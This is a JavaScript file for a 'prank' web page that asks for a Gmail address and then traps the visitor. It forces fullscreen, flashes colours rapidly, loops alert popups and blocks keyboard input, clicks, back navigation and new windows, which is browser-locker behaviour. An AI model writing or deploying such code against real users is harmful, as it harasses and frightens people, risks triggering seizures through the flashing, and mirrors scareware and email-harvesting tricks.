/*
 *   █████╗ ██╗  ██╗██╗██╗██╗     ███████╗██╗ ██████╗ ██╗   ██╗██╗   ██╗  
 *   ██╔══██╗██║  ██║██║██║██║     ██╔════╝██║██╔═══██╗██║   ██║██║   ██║  
 *   ███████║███████║██║██║██║     █████╗  ██║██║   ██║██║   ██║██║   ██║  
 *   ██╔══██║██╔══██║██║██║██║     ██╔══╝  ██║██║   ██║██║   ██║██║   ██║  
 *   ██║  ██║██║  ██║██║██║███████╗██║     ██║╚██████╔╝╚██████╔╝╚██████╔╝  
 *   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════ ╝  ╚═════╝   
 *                                   kaisupreme                              
 *   ╔═════════════════════════════════════════════════════════════════════╗  
 *   ║   Powered by KA1 tamatarnet                                         ║  
 *   ║   System affiliated by PD MIRCHI V1                                  ║  
 *   ║   This code is crafted using its own code BETA powerful library.     ║  
 *   ║   Credits: Made by LEGACY Ar!O and dramatic kai                      ║  
 *   ╚═════════════════════════════════════════════════════════════════════╝  
 */

const startPrankButton = document.getElementById('startPrank');
const stopPrankButton = document.getElementById('stopPrank');
const emailInputDiv = document.getElementById('emailInput');
const gmailInput = document.getElementById('gmailInput');
const submitEmailButton = document.getElementById('submitEmail');
const leaveButton = document.createElement('button');
leaveButton.textContent = 'Leave';
leaveButton.style.position = 'fixed';
leaveButton.style.top = '10px';
leaveButton.style.left = '10px';
leaveButton.style.zIndex = '10000';
leaveButton.style.display = 'none';

document.body.appendChild(leaveButton);

const messages = [
    "Oh hi there! Good news that you're trapped!",
    "You can't escape from here!",
    "Oh, you wanna escape?",
    "Try!",
    "Can't?? Sorry, I made you angry and surprised. Find the stop button to escape!"
];

function showMessage() {
    const message = messages[Math.floor(Math.random() * messages.length)];
    alert(message);
}

function startPrank() {
    startPrankButton.style.display = 'none';
    emailInputDiv.style.display = 'block';
}

function submitEmail() {
    userEmail = gmailInput.value;
    if (!userEmail || !userEmail.endsWith('@gmail.com')) {
        alert("Invalid email. Please enter a valid Gmail address.");
        return;
    }

    prankActive = true;
    emailInputDiv.style.display = 'none';
    leaveButton.style.display = 'block';

    // Make the stop button visible but in a random position
    stopPrankButton.style.position = 'fixed';
    stopPrankButton.style.top = Math.random() * (window.innerHeight - 50) + 'px';
    stopPrankButton.style.left = Math.random() * (window.innerWidth - 100) + 'px';
    stopPrankButton.style.display = 'block';
    stopPrankButton.style.zIndex = '9999';

    const colors = ['white', 'black', 'pink', 'blue'];
    let i = 0;

    const interval = setInterval(() => {
        document.body.style.backgroundColor = colors[i % colors.length];
        i++;
    }, 100);

    // Request fullscreen
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
    }

    stopPrankButton.addEventListener('click', () => stopPrank(interval));
    leaveButton.addEventListener('click', tryToLeave);

    setInterval(showMessage, 2000);
}

function stopPrank(interval) {
    clearInterval(interval);
    document.body.style.backgroundColor = '';
    prankActive = false;
    alert("You found the stop button! But you still can't leave :)");
    leaveButton.style.display = 'none';
    stopPrankButton.style.display = 'none';
}

function tryToLeave() {
    alert("Nice try, but you can't leave!");
}

startPrankButton.addEventListener('click', startPrank);
submitEmailButton.addEventListener('click', submitEmail);

// Prevent the page from being closed or navigated away
window.addEventListener('beforeunload', (event) => {
    if (prankActive) {
        event.preventDefault();
        event.returnValue = '';
    }
});

// Capture all clicks
document.addEventListener('click', (event) => {
    if (prankActive && event.target !== stopPrankButton && event.target !== leaveButton) {
        event.preventDefault();
        event.stopPropagation();
    }
});

// Disable right-click
document.addEventListener('contextmenu', (event) => {
    if (prankActive) {
        event.preventDefault();
    }
});

// Disable keyboard shortcuts
document.addEventListener('keydown', (event) => {
     if (prankActive) {
        event.preventDefault();
    }
});

// Intercept and prevent navigation
let popStateTimeout;
window.addEventListener('popstate', function(event) {
    if (prankActive) {
        event.preventDefault();
        window.history.pushState(null, '', window.location.href);
        clearTimeout(popStateTimeout);
        popStateTimeout = setTimeout(function() {
            window.history.pushState(null, '', window.location.href);
        }, 0);
    }
});

// Prevent opening new windows or tabs
window.open = function() { return null; };

// If the user somehow manages to leave, redirect back
if (document.referrer.indexOf(location.hostname) !== -1) {
    history.pushState(null, '', document.referrer);
    startPrank();
}
